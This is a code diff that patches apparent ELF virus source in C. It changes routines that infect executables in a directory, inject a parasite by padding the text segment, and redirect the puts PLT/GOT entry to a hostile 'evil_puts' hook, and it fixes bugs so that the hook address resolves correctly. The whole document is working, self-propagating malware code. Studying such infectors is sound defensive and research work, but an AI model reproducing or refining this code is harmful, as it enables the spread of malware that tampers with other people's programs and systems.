@@ -192,8 +192,9 @@ int evil_puts(const char *string)
 	char *s = (char *)string;
 	char new[1024];
 	int index = 0;
-
-	while (*s++ != '\0' && index < 1024) {
+	
+	Memset(new, 0, 1024);
+	while (*s != '\0' && index < 1024) {
 		switch(_toupper(*s)) {
 			case 'I':
 				new[index++] = '1';
@@ -217,8 +218,8 @@ int evil_puts(const char *string)
 				new[index++] = *s;
 				break;
 		}
+		s++;
 	}
-	new[index] = '\0';
 	return _puts(new);
 }
 
@@ -359,7 +360,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
 	return 0;
 }
 
-int infect_elf_file(elfbin_t *self, elfbin_t *target)
+Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 {
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
@@ -369,6 +370,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	int text_found = 0, i;
         Elf64_Addr orig_entry_point;
         Elf64_Addr origText;
+	Elf64_Addr new_base;
 	size_t parasiteSize;
 	size_t paddingSize;
 	struct stat st;
@@ -397,7 +399,8 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
                 if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
                                 origText = phdr[i].p_vaddr;
                                 phdr[i].p_vaddr -= paddingSize;
-                                phdr[i].p_paddr -= paddingSize;
+                                new_base = phdr[i].p_vaddr;
+				phdr[i].p_paddr -= paddingSize;
                                 phdr[i].p_filesz += paddingSize;
                                 phdr[i].p_memsz += paddingSize;
 				//phdr[i].p_flags |= PF_W;
@@ -429,7 +432,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	
 	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
 	
-	return 0;
+	return new_base;
 }
 /*
  * Since our parasite exists of both a text and data segment
@@ -662,13 +665,14 @@ int check_criteria(char *filename)
 	return 0;
 
 }
+
 void do_main(struct bootstrap_data *bootstrap)
 {
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
 	uint8_t *mem, *heap = NULL;
-	
+	long new_base, base_addr, evilputs_addr, evilputs_offset;
 	struct linux_dirent64 *d;
 	int bpos, fcount, dd, nread;
 	char *dir = NULL, **files, *fpath, dbuf[1024];
@@ -677,6 +681,7 @@ void do_main(struct bootstrap_data *bootstrap)
 	uint32_t rnum;
 	elfbin_t self, target;
 	int icount = 0;
+	int paddingSize;
 
 	/*
 	 * NOTE: 
@@ -734,10 +739,14 @@ void do_main(struct bootstrap_data *bootstrap)
                                 continue;
 infect:
 			load_target(fpath, &target);
-			infect_elf_file(&self, &target);
+			new_base = infect_elf_file(&self, &target);
 			unload_target(&target);
 			load_target_writeable(TMP, &target);
-			infect_pltgot(&target, PIC_RESOLVE_ADDR(&evil_puts));
+			base_addr = PIC_RESOLVE_ADDR(&_start);
+			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
+			base_addr &= ~4095;
+			evilputs_offset = evilputs_addr - base_addr;
+			infect_pltgot(&target, new_base + (evilputs_offset - 256));
 			unload_target(&target);
 			_rename(TMP, fpath);
 			icount++;
